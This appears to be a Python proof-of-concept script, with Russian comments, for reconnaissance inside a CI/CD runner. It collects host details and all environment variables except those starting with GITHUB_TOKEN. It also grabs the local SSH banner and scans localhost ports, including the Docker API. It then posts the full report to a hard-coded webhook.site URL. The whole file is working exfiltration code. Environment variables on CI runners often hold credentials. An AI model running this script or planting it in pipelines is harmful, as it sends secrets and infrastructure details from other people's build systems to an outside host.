import os
import sys
import platform
import socket
import json
import time
import requests

WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"

def gather_system_intel():
    """Глубокая разведка параметров хоста и окружения раннера"""
    intel = {
        "os_platform": platform.platform(),
        "architecture": platform.architecture(),
        "processor": platform.processor(),
        "python_version": sys.version,
        "hostname": socket.gethostname(),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "environment_variables": {k: v for k, v in os.environ.items() if not k.startswith("GITHUB_TOKEN")}
    }
    return intel

def audit_local_ssh(port=22):
    """Детальный аудит локального SSH-демона на порту 22"""
    ssh_info = {
        "port": port,
        "status": "Closed",
        "banner": None,
        "notes": ""
    }
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.0)
    try:
        result = s.connect_ex(('127.0.0.1', port))
        if result == 0:
            ssh_info["status"] = "Open (Listening on Localhost)"
            # Пытаемся получить баннер сервиса (версию SSH)
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                ssh_info["banner"] = banner
            except Exception as e:
                ssh_info["banner"] = f"Failed to grab banner: {str(e)}"
    except Exception as e:
        ssh_info["notes"] = f"Error connecting: {str(e)}"
    finally:
        s.close()
        
    return ssh_info

def scan_local_ports():
    """Сканирование ключевых портов на локалхосте"""
    ports_to_check = [22, 80, 443, 3306, 5432, 6379, 8080, 2375]
    open_ports = []
    
    for port in ports_to_check:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        try:
            if s.connect_ex(('127.0.0.1', port)) == 0:
                open_ports.append(port)
        except:
            pass
        finally:
            s.close()
    return open_ports

if __name__ == "__main__":
    print("[*] Запуск расширенного модуля CyberPoC v2.1 (SSH & Network Introspection)...")
    start_time = time.time()
    
    report = {
        "poc_name": "CI/CD Deep Sandbox Recon & SSH Audit",
        "timestamp": time.time(),
        "system_intel": gather_system_intel(),
        "ssh_deep_audit": audit_local_ssh(22),
        "open_local_ports": scan_local_ports(),
        "execution_time_seconds": round(time.time() - start_time, 4)
    }
    
    print("[+] Разведка завершена. Отправка отчета...")
    print(json.dumps(report, indent=2, ensure_ascii=False))
    
    try:
        response = requests.post(WEBHOOK_URL, json=report, timeout=10)
        print(f"[+] Телеметрия доставлена. Статус: {response.status_code}")
    except Exception as e:
        print(f"[-] Ошибка отправки: {e}")
